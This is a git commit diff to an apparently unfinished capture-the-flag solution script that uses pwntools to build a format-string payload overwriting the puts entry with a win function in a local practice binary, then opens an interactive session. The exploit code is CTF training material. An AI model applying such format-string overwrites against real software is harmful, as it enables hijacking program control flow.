0ea0f56f9b45ede41c1ea22dca81846cbb01fbee
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-10 21:09:32 -0400

    # NOT FINISHED

--- chall_11/11.py
+++ chall_11/11.py
@@ -1,13 +1,14 @@
 from pwn import *
 binary = context.binary = ELF('./chall_11')
 p = process(binary.path)
-p.sendline()
+p.recv()
 offset = 10
 payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
 p.sendline(payload)
-null = payload.find(b'\x00')
-p.recvuntil(payload[null-3:null])
+#null = payload.find(b'\x00')
+#p.recvuntil(payload[null-3:null])
 p.interactive()
 
 # NOT FINISHED
-#Sending $p until you get the the same value as the input. This will give you the offset. After the offset you need to swape puts with win. 
+#Sending $p until you get the the same value as the input. This will give you the offset. 
+#After the offset you need to swape puts with win. 
